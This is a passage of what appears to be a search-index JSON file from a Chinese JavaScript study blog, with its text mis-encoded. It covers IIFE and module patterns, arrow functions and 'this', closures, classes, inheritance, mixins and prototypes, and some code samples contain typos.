Expressionï¼Œåœ¨ES5å°šæœªæ”¯æŒå—çº§ä½œç”¨åŸŸï¼Œç”¨æ¥æ¨¡æ‹Ÿå—çº§ä½œç”¨åŸŸï¼ˆä½œç”¨åŸŸä»…ä¸ºæ‹¬å·å†…ï¼Œæ‰§è¡Œå®Œæ¯•ä½œç”¨åŸŸé“¾é”€æ¯ï¼‰(function( å½¢å‚ ){    // åœ¨å‡½æ•°ä½œç”¨åŸŸå†…ï¼Œä½¿å˜é‡æ´»åŠ¨å—çº§ä½œç”¨åŸŸ})( å®å‚ )      é“¾å¼å¼•ç”¨scriptè‹¥æœ‰åŒåå‡½æ•°ï¼Œå–æœ€åå¼•å…¥åŠ è½½çš„scriptå‡½æ•°        ä½¿ç”¨æ¨¡å—åŒ–ç±»çš„æ–¹å¼  ä¼ å…¥å‚æ•°window(function(window){    function hd(){}    window.js2 = {hd} //å¯¹å¤–å¼€æ”¾ä¸€ä¸ªæ¥å£})(window);js2.hdå—ä½œç”¨åŸŸè§£å†³{\tlet hd = function(){}    window.js1 = {hd};}### â‰ï¸ç®­å¤´å‡½æ•°ï¼ˆEs6ï¼‰const hd = ( å½¢å‚ ) =&gt; { å‡½æ•°ä½“ };let hd = [1,2,3].filter(value =&gt; value &lt;= 3);const sum = (num1,num2) =&gt; num1 + num2;\t// å‡½æ•°ä½“ åªæœ‰ä»£ç ï¼Œå¯ä»¥çœç•¥å¤§æ‹¬å·ï¼›è¿”å›å€¼ä¸ºæ‰§è¡Œç»“æœconsole.log( sum(10,20) ); // 30const fn = v =&gt; alert(v); //å½¢å‚ åªæœ‰ä¸€ä¸ªï¼Œå¯ä»¥çœç•¥å°æ‹¬å·fn(20);  é€’å½’ ã€æ„é€ ã€äº‹ä»¶å¤„ç†å™¨ä¸é€‚ç”¨ç®­å¤´å‡½æ•°  æ²¡æœ‰ argumentsï¼ˆåªèƒ½é€šè¿‡å®šä¹‰çš„å‚æ•°åè®¿é—®ï¼‰ã€ superã€ new.target å±æ€§ï¼Œä¹Ÿæ²¡æœ‰ prototype å±æ€§  æ— å…·ä½“å‚æ•°åç§°ï¼Œå›è°ƒä¸æ–¹ä¾¿ã€ç®­å¤´å‡½æ•°ï¼ŒthisæŒ‡å‘ä¸Šä¸€çº§çš„thisï¼Œæ²¡æœ‰è‡ªå·±çš„this  å‡½æ•°å®šä¹‰æ—¶ä½œç”¨åŸŸå°±æœ‰äº†ï¼Œthiséœ€å…·ä½“åˆ°æ‰§è¡Œæ—¶ï¼Œç®­å¤´å‡½æ•°åœ¨ç»‘å®šæ—¶å†³å®švar obj = {    age: 40,    say: () =&gt; { alert(this.age) }  // å®é™…ä¸Šæ˜¯å®šä¹‰åœ¨windowä¸‹çš„æ–¹æ³•}obj.say(); // undefind// objæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡ä¸äº§ç”Ÿä½œç”¨åŸŸï¼›ä½œä¸ºwindowè°ƒç”¨ï¼Œè¿”å›undefinedå–å¯¹è±¡åŒæ—¶å–DOMèŠ‚ç‚¹  å–å¯¹è±¡ï¼šç®­å¤´å‡½æ•°ï¼›å–èŠ‚ç‚¹ï¼šæ™®é€šå‡½æ•°ï¼Œä¸å¯åŒæ—¶å®ç°è§£å†³æ–¹æ³•ï¼š  button.addEventListener(\"click\",function(event){})ä¸­çš„event.targetæŒ‡å½“å‰ç»‘å®šçš„æŒ‰é’®let Dom = {    site: '',    bind: functon(){\t\tconst button = document.querySelector(\"button\");button.addEventListener(\"click\",event =&gt; {\tconsole.log(this); //ç®­å¤´å‡½æ•°æŒ‡çˆ¶çº§å¯¹è±¡    console.log(event.target);//è·å–å½“å‰ç»‘å®šçš„DOMèŠ‚ç‚¹        })\t}}  const self = thisï¼›  hanleEvent  element.addEventListener(type, listener[, useCapture]);å…¶ä¸­listenerï¼šå½“æŒ‡å®šçš„äº‹ä»¶ç±»å‹å‘ç”Ÿæ—¶è¢«é€šçŸ¥åˆ°çš„ä¸€ä¸ªå¯¹è±¡ã€‚è¯¥å‚æ•°å¿…é¡»æ˜¯å®ç°EventListeneræ¥å£çš„ä¸€ä¸ªå¯¹è±¡æˆ–å‡½æ•°ã€‚å³ï¼Œç¬¬äºŒä¸ªå‚æ•°é™¤äº†å¯ä»¥ä¼ å…¥å‡½æ•°å¤–ï¼Œè¿˜å¯ä»¥ä¼ å…¥å¯¹è±¡ã€‚  äº‹ä»¶ä¼šè‡ªåŠ¨åœ¨ä¼ å…¥å¯¹è±¡ä¸­å¯»æ‰¾handleEventæ–¹æ³•let Dom = {    handleEvent: function(event){            },    bind: funcion(){    \tconst button = document.querySelector(\"button\");\t\tbutton.addEventListener(\"click\",this); //ä¼ å…¥å½“å‰å¯¹è±¡ï¼Œè‡ªåŠ¨å¯»æ‰¾handleEventæ–¹æ³•\t}}è®¿é—®ç§æœ‰å˜é‡â€‹\tä»»ä½•å®šä¹‰åœ¨å‡½æ•°æˆ–å—ä¸­çš„å˜é‡ï¼Œéƒ½å¯ä»¥è®¤ä¸ºæ˜¯ç§æœ‰çš„ï¼Œå› ä¸ºåœ¨è¿™ä¸ªå‡½æ•°/å—çš„å¤–éƒ¨æ— æ³•è®¿é—®å…¶ä¸­çš„å˜é‡ã€‚ç‰¹æƒæ–¹æ³•â€‹\tå…¶å®å°±æ˜¯ä½¿ç”¨ é—­åŒ… çš„åŸç†ï¼Œå…·æœ‰è®¿é—®æ„é€ å‡½æ•°ä¸­å®šä¹‰çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°çš„èƒ½åŠ›ã€‚function Person(value){    // ç§æœ‰å˜é‡    let name = value    // ç‰¹æƒæ–¹æ³•    this.getName = function(){ return name; }    this.setName = function(value) { name = value; }}let person = new Person('lisi');person.getName(); // 'lisi'é™æ€ç§æœ‰å˜é‡â€‹\tç§æœ‰ä½œç”¨åŸŸå†…å®šä¹‰å…¬ç”¨çš„æ„é€ å‡½æ•°ï¼Œå¹¶åœ¨æ„é€ å‡½æ•°åŸå‹ä¸Šæ·»åŠ ç‰¹æƒæ–¹æ³•å®ç°è®¿é—®ç§æœ‰å˜é‡ã€‚ä½†è¿™ä¸ªç§æœ‰å˜é‡æ˜¯â€œå…±äº«â€çš„.â€‹\tåœ¨ä¸‹é¢ä¾‹å­ä¸­ï¼Œæ„é€ å‡½æ•°ä½¿ç”¨å‡½æ•°è¡¨è¾¾å¼è€Œä¸æ˜¯å‡½æ•°å£°æ˜ï¼Œå‡½æ•°å£°æ˜ä¼šåˆ›å»ºå†…éƒ¨å‡½æ•°ï¼Œè¿™é‡Œä¸æ˜¯å¿…é¡»çš„ã€‚function (){    // ç§æœ‰å˜é‡     let privateVariable = 10;    // ç§æœ‰å‡½æ•°    function privateFunction (){        return false;    }    //  æ„é€ å‡½æ•°    // 1. ä¸å¸¦å…³é”®å­—çš„ï¼Œå…¨å±€å˜é‡    // 2. è¡¨è¾¾å¼å£°æ˜ï¼Œæ‰§è¡Œæ—¶æ‰ä¼šåˆ›å»ºå‡½æ•°    MyObject = function() {}    // åœ¨æ„é€ å‡½æ•°çš„åŸå‹ä¸Šæ·»åŠ ç‰¹æƒæ–¹æ³•    MyObject.prototype.publicMethod = function (){        return privateFunction();    }}æ¨¡å—æ¨¡å¼â€‹\tå•ä¾‹å¯¹è±¡(singleton)ï¼šåªæœ‰ä¸€ä¸ªå®ä¾‹çš„å¯¹è±¡ï¼Œé€šå¸¸é€šè¿‡ å¯¹è±¡å­—é¢é‡ åˆ›å»ºã€‚â€‹\tæ¨¡å—æ¨¡å¼æ˜¯åœ¨å•ä¾‹å¯¹è±¡åŸºç¡€ä¸ŠåŠ ä»¥æ‰©å±•ï¼Œé€šè¿‡ä½œç”¨åŸŸé“¾å…³è”ç§æœ‰å˜é‡å’Œç‰¹æƒæ–¹æ³•ã€‚let singleton = function() {    // ç§æœ‰å˜é‡     let privateVariable = 10;    // ç§æœ‰å‡½æ•°    function privateFunction (){        return false;    }    // ç‰¹æƒã€å…¬æœ‰æ–¹æ³•å’Œå±æ€§    return { // è¿”å›å¯¹è±¡å­—é¢é‡        publicProperty: true,        publicMethod(){            return privateFunction();        }    }    }â€‹\tå‡½æ•°è¿”å›çš„å¯¹è±¡å­—é¢é‡ï¼ŒåªåŒ…å«å¯ä»¥å…¬å¼€è®¿é—®çš„å±æ€§å’Œæ–¹æ³•ï¼›å› ä¸ºå…¶å®šä¹‰åœ¨åŒ¿åå‡½æ•°çš„å†…éƒ¨ï¼Œæ‰€ä»¥å¯ä»¥è®¿é—®åŒä¸€ä¸ªä½œç”¨åŸŸçš„ç§æœ‰å˜é‡å’Œç§æœ‰å‡½æ•°ã€‚â€‹\tå¯¹è±¡å­—é¢é‡ æœ¬è´¨ä¸Šå®šä¹‰äº† å•ä¾‹å¯¹è±¡çš„å…¬å…±æ¥å£ã€‚å¦‚æœå•ä¾‹å¯¹è±¡éœ€è¦è¿›è¡Œåˆå§‹åŒ–ï¼Œä¸”éœ€è¦è®¿é—®ç§æœ‰å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨ã€‚æ¨¡å—å¢å¼ºæ¨¡å¼â€‹\tåœ¨è¿”å›å¯¹è±¡ä¹‹å‰ï¼Œå¯¹å…¶è¿›è¡Œå¢å¼ºã€‚é€‚ç”¨äºï¼šå•ä¾‹å¯¹è±¡éœ€è¦æŸä¸ªç‰¹å®šç±»å‹çš„å®ä¾‹ï¼Œä½†åˆéœ€è¦ç»™å®ƒæ·»åŠ é¢å¤–å±æ€§ã€æ–¹æ³•let application = function(){    let components = new Arrya();    // æŒ‡å®šæŸç§ç‰¹å®šçš„ç±»å‹    components.push(new BaseComponent());        // åˆ›å»ºå±€éƒ¨å˜é‡ï¼Œä¿å­˜é¢å¤–åŠŸèƒ½çš„å®ä¾‹    let app = new BaseComponent();    // è·å–ç§æœ‰å˜é‡çš„å±æ€§    app.getCompontCount = function(){        return components.length;    }    // è®¾ç½®ç§æœ‰å˜é‡    app.setCompontRegister = function(components){        return components.push(component)    }    return app; // è¿”å›å®ä¾‹}â€‹\tapplicationè¿”å›å€¼æ˜¯appå®ä¾‹ï¼Œå¯ä»¥è®©componentsè¢«å¤–éƒ¨è®¿é—®åˆ°"
  },
  
  {
    "title": "6. ç±»",
    "url": "/posts/6.%E7%B1%BB/",
    "categories": "JavaScript, Object, åŸå‹é“¾",
    "tags": "javascriptBase",
    "date": "2022-08-25 00:00:00 +0800",
    





    
    "snippet": "  å£°æ˜ï¼šclass name(){ }ï¼›å®ä¾‹ï¼šnew name( )// ç±»å£°æ˜class Person {}// ç±»è¡¨è¾¾å¼const Animal = class AnimalClass {};// æ¥æ”¶ç±»çš„å˜é‡åç§°å¯ä»¥æ”¹å˜ï¼Œä¹‹åå¯ä»¥é€šè¿‡ Aniaml.name å±æ€§è·å–ç±»åç§°å­—ç¬¦ä¸²ï¼›ä½†ä¸èƒ½å•ç‹¬ä½¿ç”¨ç±»åç§°å­—ç¬¦ä¸²è®¿é—®ç±»Animal.name // AnimalClassAnimalClas...",
    "content": "  å£°æ˜ï¼šclass name(){ }ï¼›å®ä¾‹ï¼šnew name( )// ç±»å£°æ˜class Person {}// ç±»è¡¨è¾¾å¼const Animal = class AnimalClass {};// æ¥æ”¶ç±»çš„å˜é‡åç§°å¯ä»¥æ”¹å˜ï¼Œä¹‹åå¯ä»¥é€šè¿‡ Aniaml.name å±æ€§è·å–ç±»åç§°å­—ç¬¦ä¸²ï¼›ä½†ä¸èƒ½å•ç‹¬ä½¿ç”¨ç±»åç§°å­—ç¬¦ä¸²è®¿é—®ç±»Animal.name // AnimalClassAnimalClass // undefinedâ€‹\tç±»è¡¨è¾¾å¼Animalï¼Œåœ¨å®ƒä»¬æ±‚å€¼ä¹‹å‰ä¸èƒ½è¢«å¼•ç”¨ï¼Œä¸”ä¸èƒ½è¢«æå‡ã€‚  ä½œç”¨åŸŸï¼š å—çº§ä½œç”¨åŸŸ é™åˆ¶ç±»çš„æ„æˆç±»æ–¹æ³•â€‹\tç±»æ–¹æ³•ç­‰åŒäºå¯¹è±¡å±æ€§ï¼Œå…¶é”®å¯ä»¥æ˜¯ å­—ç¬¦ä¸²ã€ç¬¦å·ã€æˆ–æ˜¯è®¡ç®—åçš„å€¼class Person(){ // ç±»åé¦–å­—æ¯å¤§å†™ï¼›ç±»ä¸­çš„æ–¹æ³•ï¼Œ ä¸éœ€è¦functionï¼›æ–¹æ³•ä¹‹é—´ä¸éœ€è¦, éš”å¼€    // æ„é€ æ–¹æ³•\tconstruct(uname){        // å®ä¾‹æˆå‘˜\t\tthis.name = uname; // è‡ªåŠ¨æ·»åŠ äº†å±æ€§\t}    // å®ä¾‹æ–¹æ³•\tsing(song) {\t\tconsole.log(this.name + song);\t}    // é™æ€æ–¹æ³•ï¼šæ¯ä¸ªç±»ä¸Šåªæœ‰ä¸€ä¸ªï¼Œthiså¼•ç”¨è‡ªèº«ï¼›é€‚åˆç”¨ä½œå®ä¾‹å·¥ç¨‹    static shareWithSub() {}    // è·å–å‡½æ•°    get myName {}    // è®¾ç½®å‡½æ•°    set myName(newName) {}}æˆå‘˜æ•°æ®â€‹\tæŠŠæ–¹æ³•å®šä¹‰åœ¨ç±»æ„é€ å‡½æ•°ã€ç±»å—ä¸­ï¼Œä½†ä¸èƒ½åœ¨ç±»å—ä¸­ç»™åŸå‹æ·»åŠ åŸå§‹å€¼ã€å¯¹è±¡ä½œä¸ºæˆå‘˜æ•°æ®ã€‚ç»™åŸå‹å®šä¹‰æˆå‘˜æ•°æ®ï¼šPerson.prototype.greeting = 'my name is'Person.name = 'Jack'console.log(`${Person.prototype.greeting} ${this.name}`)è¿­ä»£å™¨ &amp; ç”Ÿæˆå™¨class Person {    *createNameIterator(){ // åŸå‹ä¸Šå®šä¹‰è¿­ä»£å™¨\t\tyield 'Jack';\t\tyield 'Mack';\t\tyield 'Anry';            }    static *createTimeIterator(){ // ç±»ä¸Šå®šä¹‰è¿­ä»£å™¨\t\tyield '220101';\t\tyield '220102';\t\tyield '220103';            }}const timeIterator = Person.createTimeIteratortimeIterator.next().value //220101timeIterator.next().value //220102let p = new Person();const nameIterator = p.createNameIterator()nameIterator.next().value //JacknameIterator.next().value //Mackâ€‹\tæ·»åŠ ä¸€ä¸ªé»˜è®¤è¿­ä»£å™¨ï¼ŒæŠŠç±»å®ä¾‹å˜æˆå¯è¿­ä»£å¯¹è±¡class Person() {    constructor(){        this.name = ['Jack','Mack','Anry']    }\t*[Symbol.iterator]() { // è¿”å›è¿­ä»£å™¨ï¼Œä¸ç›´æ¥æ‰§è¡Œå†…éƒ¨æŒ‡ä»¤        yield *this.name.entries();    }    [Symbol.iterator]() { // è¿”å›å…ƒç´ åœ°å€ï¼Œé”®å€¼å¯¹        yield *this.name.entries();    }}class Star {    constructor( name, age ){        this.btn = document.querySelector('button');        this.btn.onclick = this.sing; \t// å½“ç‚¹å‡»æ—¶ï¼Œè°ƒç”¨singå‡½æ•°ï¼Œ        this.btn.onclick = this.sing(); // ç«‹å³æ‰§è¡Œsingå‡½æ•°ï¼Œundefined       \t/**        ä¸ªäººç†è§£ï¼šthis.sing ä¼ å…¥äº†å‡½æ•°æ‰€åœ¨çš„åœ°å€ï¼Œç‚¹å‡»æ—¶æŸ¥æ‰¾åˆ°å‡½æ•°å†è°ƒç”¨ï¼›thisæŒ‡å‘è°ƒç”¨è€…                this.sing() æ˜¯å‡½æ•°è°ƒç”¨è¯­å¥ï¼Œè¿”å›çš„ç»“æœèµ‹å€¼ç»™æŒ‰é’®ï¼›thisæŒ‡å‘æ„é€ è€…        */    }}å®ä¾‹åŒ–â€‹\tç±»å¿…é¡»ä½¿ç”¨newå®ä¾‹åŒ–å¯¹è±¡ã€‚è§£é‡Šå™¨åœ¨ä½¿ç”¨newæ“ä½œç¬¦åˆ›å»ºç±»æ—¶ï¼Œéœ€è¦è°ƒç”¨constructorå…³é”®å­—å®šä¹‰çš„å‡½æ•°ã€‚ä¸å®šä¹‰æ„é€ å‡½æ•°ï¼Œç›¸å½“äºä½¿ç”¨ç©ºå‡½æ•°ã€‚ä½¿ç”¨newæ“ä½œç¬¦æ—¶ï¼Œæ‰§è¡Œå››ä¸ªæ­¥éª¤ã€‚â€‹\tç±»å®ä¾‹åŒ–æ—¶ä¼ å…¥çš„å‚æ•°ï¼Œä¼šä½œä¸ºæ„é€ å‡½æ•°çš„å‚æ•°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿”å›æ„é€ å‡½æ•°åˆ›å»ºçš„å¯¹è±¡ï¼›å¦‚æœä¿®æ”¹é»˜è®¤è¿”å›å€¼ï¼Œè€Œæ˜¯å…¶ä»–å¯¹è±¡ï¼Œè¿™ä¸ªç»“æœå°†ä¸ä¼šè¢«instanceOfæ£€æµ‹å‡ºè·Ÿç±»æœ‰ä»»ä½•å…³ç³»ã€‚class Person{    constructor(){        return {}    }}let p1 = new Person(); // {}â€‹\tç±»çš„æ„é€ å‡½æ•°ï¼Œé™¤äº†å¿…é¡»ä½¿ç”¨newæ“ä½œç¬¦è°ƒç”¨ï¼Œåœ¨ç±»å®ä¾‹åŒ–å®Œæˆåï¼Œå°±æˆä¸ºäº†ä¸€ä¸ªæ™®é€šçš„å®ä¾‹æ–¹æ³•ã€‚â€‹\tæ™®é€šæ„é€ å‡½æ•°ä¸ä½¿ç”¨newè°ƒç”¨ï¼Œä»¥å…¨å±€çš„thisï¼ˆé€šå¸¸æ˜¯windowï¼‰ä½œä¸ºå†…éƒ¨å¯¹è±¡let p1 = new Person(); // {} p1 instanceof Person  // truelet p2 = new Person.constructor(); // ä½¿ç”¨æ„é€ å‡½æ•°å¼•ç”¨æ„é€ ä¸€ä¸ªæ–°å®ä¾‹p2 instanceof Performance //falsep1 == p2 // falseâ€‹\tç±»ä¸­å®šä¹‰çš„constructor()ä¸ä¼šè¢«å½“ä½œæ„é€ å‡½æ•°â€‹\tç±»çš„æœ¬è´¨æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å‡½æ•°ã€‚ç±»æ ‡è¯†ç¬¦æœ‰prototypeå±æ€§ï¼Œè¿™ä¸ªåŸå‹ä¸­çš„constructorå±æ€§æŒ‡å‘ç±»è‡ªèº«ã€‚ ç±»ä¸­å®šä¹‰çš„constructor()ä¸ä¼šè¢«å½“ä½œæ„é€ å‡½æ•°â€‹\tï¼ˆå®ä¾‹åªä¿ç•™æŒ‡å‘åŸå‹çš„æŒ‡é’ˆ[[prototype]]ï¼Œæ²¡æœ‰æŒ‡å‘æ„é€ å‡½æ•°çš„æŒ‡é’ˆï¼‰typeof Person // function// Person è¢«è®¤ä¸ºæ˜¯æ„é€ å‡½æ•°Person === Person.prototype.constructor // trueç”¨æ³•ä½œä¸ºå‚æ•°let classList = [    class {        constructor(id){            this.id = id;            console.log(`instance ${this.id}`)        }    }]function createInstance(classDefinition, id){    return new classDefinition(id)}let foo = createInstance(classList[0],1); // æ‰¹é‡ç”Ÿæˆç±» foo = classListÂ {id: 1}ç«‹å³å®ä¾‹åŒ–new class Foo { \tconstructor(id){        this.id = id;        console.log(`instance ${this.id}`)    }    }(1)ç»§æ‰¿class Father {    constructor (x, y) { // 1.çˆ¶ç±»ç”Ÿæˆå®ä¾‹æ—¶ï¼Œçˆ¶ç±»çš„xã€yè¢«èµ‹å€¼        this.x = x;        this.y = y;    }    sum() {    \tconsole.log(this.x + this.y); // 2.è¿™é‡ŒthisæŒ‡å‘çˆ¶ç±»çš„xã€y    }}class Son extends Father {    constructor (x, y) {        // 4. æ­¤å¤„åº”è¯¥è°ƒç”¨çˆ¶ç±»å¯¹æ„é€ æ–¹æ³•ï¼šsuper(x, y);        this.x = x;        this.y = y;    }}let son = new Son(1, 2); // 3.ç”Ÿæˆæ˜¯å­ç±»ï¼Œçˆ¶ç±»æ„é€ å‡½æ•°æœªè°ƒç”¨ï¼Œçˆ¶ç±»çš„xã€yè¿˜æ˜¯undefinedï¼Œä¸èƒ½è®¡ç®—son.sum(); // æŠ¥é”™ï¼  extends å¯ä»¥åœ¨ç±»è¡¨è¾¾å¼ä¸­ä½¿ç”¨ï¼š const son  = new Son extends Father  this è°è°ƒç”¨æŒ‡å‘è°  superå…³é”®å­—ï¼šè°ƒç”¨çˆ¶ç±»çš„å‡½æ•°ï¼ˆæ„é€ å‡½æ•°ã€é™æ€å‡½æ•°ï¼‰          åªèƒ½åœ¨æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°ã€é™æ€å‡½æ•°ä¸­è°ƒç”¨                  åœ¨æ„é€ å‡½æ•°ä¸­ä½¿ç”¨super()ï¼Œè¡¨ç¤ºç›´æ¥è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°super.constructor()ï¼Œéœ€è¦æ‰‹åŠ¨ä¼ å…¥          é™æ€å‡½æ•°ä¸­ä½¿ç”¨superï¼Œå¯ä»¥è°ƒç”¨ç»§æ‰¿ç±»çš„é™æ€æ–¹æ³•ã€‚                    ä¼šè¿”å›çˆ¶ç±»çš„thisï¼Œæ‰€ä»¥ã€! superå¿…é¡»åœ¨å­ç±»thisä¹‹å‰ã€‘        callæ–¹æ³•ï¼š åœ¨å­æ„é€ å‡½æ•°ä¸­ï¼Œä½¿ç”¨Father.call(this)â€‹\tæ´¾ç”Ÿç±»ä¸­æ˜¾ç¤ºå®šä¹‰äº†æ„é€ å‡½æ•°ï¼Œè¦ä¹ˆğŸ”–è¿”å›è°ƒç”¨superè¿”å›çˆ¶ç±» ï¼Œè¦ä¹ˆğŸ·ï¸è¿”å›ä¸€ä¸ªå¯¹è±¡class Son extends Father(){    constructor(){        super();    }}class Son extends Father(){    constructor(){        return {};    }}æŠ½è±¡åŸºç±»â€‹\tå¯ä»¥ç»™å…¶ä»–ç±»ç»§æ‰¿ï¼Œä½†æœ¬èº«ä¸èƒ½å®ä¾‹åŒ–ï¼›ä½¿ç”¨new.targetè¯†åˆ«å½“å‰å®ä¾‹åŒ–çš„ç±»å‹ï¼Œä»è€Œå†³å®šè¦ä¸è¦å¯¹å…¶è¿›è¡Œå®ä¾‹åŒ–class Vehicle{    constructor() {\t\tconsole.log(new.target);        // è¯†åˆ«å½“å‰å®ä¾‹åŒ–çš„ç±»å‹        if(new.target === Vehicle) throw new Error(\"Vehicle can't be directly instantiated\")        // ..                // å¿…é¡»å®ç°æŸä¸ªæ–¹æ³•        if(!this.foo) throw new Error(\"Inheriting class must define foo{}\");    }}new class Bus extends Vehicle {    foo() {}}new class Bus extends Vehicle {} // Errorï¼šInheriting class must define foo{}new class Vehicle {} // Errorï¼šVehicle can't be directly instantiatedspeciesè®¿é—®å™¨â€‹\tè¿”å›å®ä¾‹ç±»å‹ï¼Œå…¶è¢«æ„é€ å‡½æ•°ç”¨ä»¥åˆ›å»ºæ´¾ç”Ÿå¯¹è±¡ã€‚getteré»˜è®¤è¿”å›thisï¼Œæœªéƒ¨ç½²setterå±æ€§ï¼›é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿”å›åŸå§‹å®ä¾‹ç±»å‹ä¸€è‡´ã€‚â€‹\tå¦‚æœéœ€è¦è¦†ç›–è¿™ä¸ªè¡Œä¸ºï¼Œå¯ä»¥åœ¨å­ç±»çš„æ„é€ å‡½æ•°å†…å£°æ˜ä¸ºé™æ€æ–¹æ³•ï¼Œæˆ–è€…ç”¨ Object.defineProperty ç­‰æ–¹æ³•æ·»åŠ æˆ–ä¿®æ”¹æ­¤å±æ€§ã€‚class MyArray extends Array {  // è¦†ç›– species åˆ°çˆ¶çº§çš„ Array æ„é€ å‡½æ•°ä¸Š  static get [Symbol.species]() {    return Array;  }}const myArray = new MyArray();myArray instanceof MyArray; // falsemyArray instanceof Array;   // trueç±»æ··å…¥â€‹\tæŠŠä¸åŒç±»è¡Œä¸ºé›†ä¸­åˆ°ä¸€ä¸ªç±»ä¸­ã€‚:one: Object.assign()ï¼šå°†å¤šä¸ªå¯¹è±¡å±æ€§æ··å…¥:two: extendå…³é”®å­—åæ¥è¡¨è¾¾å¼class Vehice {}function getParentClass () {    console.log('get superClass1')    return Vehice;}class Bus extends getParentClass(); // Bus extends Vehice// å¤šé‡ç»§æ‰¿: æ¥å—ä¸€ä¸ªè¶…ç±»åšä¸ºå‚æ•°ï¼Œå°†æ··å…¥ç±»å®šä¹‰ä¸ºè¿™ä¸ªå‚æ•°çš„å­ç±»let doorMixin = (SuperClass) =&gt; class extends SuperClass{    door() { console.log(\"add car door\") }}let glassMixin = (SuperClass) =&gt; class extends SuperClass{    glass() { console.log(\"add car glass\") }}// class Bus extends doorMixin(glassMixin(Vehice)){}let bus = new Bus();// å€ŸåŠ©è¾…åŠ©å‡½æ•°ï¼Œå±•å¼€åµŒå¥—è°ƒç”¨function mixin(BaseClass, ...Mixins){ // Aarry.reduce ç´¯åŠ éå†ï¼›accumulator ç´¯åŠ å™¨\treturn Mixins.reduce((accumulator,current) =&gt; {        return current(accumulator)    }, BaseClass) // BaseClass åˆå§‹å€¼}class Bus extends mixin(Vehice,doorMixin,glassMixin){}let bus = new Bus();ä¸‰ä¸ªæ³¨æ„ç‚¹  thisçš„æŒ‡å‘é—®é¢˜ï¼š          constructor é‡Œçš„thisæŒ‡å‘åˆ›å»ºçš„å®ä¾‹å¯¹è±¡      ç±»ä¸­æ–¹æ³•çš„thisæŒ‡å‘è°ƒç”¨çš„å®ä¾‹å¯¹è±¡        ç±»æ²¡æœ‰å˜é‡æç¤ºï¼šå¿…é¡»å…ˆå£°æ˜ã€åä½¿ç”¨  ä½¿ç”¨ç±»ä¸­å…±åŒå±æ€§ã€æ–¹æ³•ï¼Œä¸€å®šè¦åŠ this"
  },
  
  {
    "title": "5. æ„é€ å‡½æ•°",
    "url": "/posts/5.%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/",
    "categories": "JavaScript, Object, åŸå‹é“¾",
    "tags": "javascriptBase",
    "date": "2022-08-23 00:00:00 +0800",
    





    
    "snippet": "æ„é€ å‡½æ•°â€‹\tå®šä¹‰ï¼š ä¸æ™®é€šå‡½æ•°å·®åˆ«åœ¨äºâ€”â€”ä½¿ç”¨äº†newè°ƒç”¨function Person(name, age, job){    this.name = name;     // ...    this.sayhello = funciton(){     \tconsole.log('my name is' + this.name)    }}// ä½¿ç”¨newå®šä¹‰Personçš„å­ç±»ï¼Œä¼šè‡ªå·±è¿”...",
    "content": "æ„é€ å‡½æ•°â€‹\tå®šä¹‰ï¼š ä¸æ™®é€šå‡½æ•°å·®åˆ«åœ¨äºâ€”â€”ä½¿ç”¨äº†newè°ƒç”¨function Person(name, age, job){    this.name = name;     // ...    this.sayhello = funciton(){     \tconsole.log('my name is' + this.name)    }}// ä½¿ç”¨newå®šä¹‰Personçš„å­ç±»ï¼Œä¼šè‡ªå·±è¿”å›å¯¹è±¡// è‡ªå®šä¹‰æ„é€ å‡½æ•°ï¼š ç¡®ä¿è¢«è¯†åˆ«ä¸ºç‰¹å®šç±»å‹newæ‰§è¡Œæ—¶åšçš„å››ä»¶äº‹æƒ…   å†…å­˜ä¸­åˆ›å»ºå¯¹è±¡  æŒ‡å®šæ„é€ å‡½æ•°ï¼šæ–°å¯¹è±¡å†…éƒ¨çš„[[Protorype]] = æ„é€ å‡½æ•°çš„prototypeå±æ€§  å®ä¾‹åŒ–å¯¹è±¡ï¼šæ„é€ å‡½æ•°çš„this æŒ‡å‘è¿™ä¸ªæ–°å¯¹è±¡  æ‰§è¡Œæ„é€ å‡½æ•°ï¼›ç»™æ–°å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•  è¿”å›è¿™ä¸ªæ–°å¯¹è±¡ this? this : {}åŸå‹â€‹\tä½¿ç”¨æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡ï¼Œå…¶å®šä¹‰çš„æ–¹æ³•å’Œå±æ€§åœ¨æ¯ä¸ªå®ä¾‹ä¸Šéƒ½å¤‡ä»½äº†ä¸€æ¬¡ï¼Œä½†å…¶æœ‰äº›åªéœ€è¦ç»´æŠ¤ä¸€ä»½ã€‚â€‹\tä¸ºæ¯ä¸ªå‡½æ•°çš„prototypeå±æ€§ä¸‹åŒ…å«ç‰¹ç‚¹å¼•ç”¨ç±»å‹çš„ å®ä¾‹å…±äº«æ–¹æ³•å’Œå±æ€§ã€‚â€”â€” åŸæ¥åœ¨æ„é€ å‡½æ•°ä¸­èµ‹äºˆå¯¹è±¡å®ä¾‹çš„å€¼ï¼Œéƒ½å¯ä»¥ç›´æ¥èµ‹å€¼ç»™å®ƒä»¬çš„åŸå‹function Person(name) {    this.name = name;}Person.protorype.sayHello = function(){    console.log('my name is' + this.name)}person1 = new Person('å°èŠ³');person2 = new Person('å°ç¦');person1 === person2 // falseperson1.name == person2.name // falseperson1.sayHello === person2.sayHello // trueconstruct.prototype  prototype æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œåˆç§°åŸå‹å¯¹è±¡  å…¶å±æ€§å’Œæ–¹æ³•éƒ½å½’æ„é€ å‡½æ•°æ‰€æœ‰  æ‰€æœ‰çš„å¯¹è±¡éƒ½å…±äº«åŸå‹å¯¹è±¡instance.__proto__  åˆç§°ä¸º å¯¹è±¡çš„åŸå‹  æ¯ä¸ªå¯¹è±¡éƒ½æœ‰è¿™ä¸ªå±æ€§æ„é€ å‡½æ•° Person.prototypeå’Œ å¯¹è±¡person.__proto_æ˜¯æŒ‡å‘æ˜¯ç­‰ä»·çš„åŸå‹çš„å…¶ä»–æ„é€ è¯­æ³•function Person() = {}// é‡æ–°å®šä¹‰å±æ€§Person.protorype.sayHello = function(){    console.log('my name is' + this.name)}// 1. å¯¹è±¡å­—é¢é‡Person.prototype = {    constructor: fatherClass, // ä½¿ç”¨æ„é€ 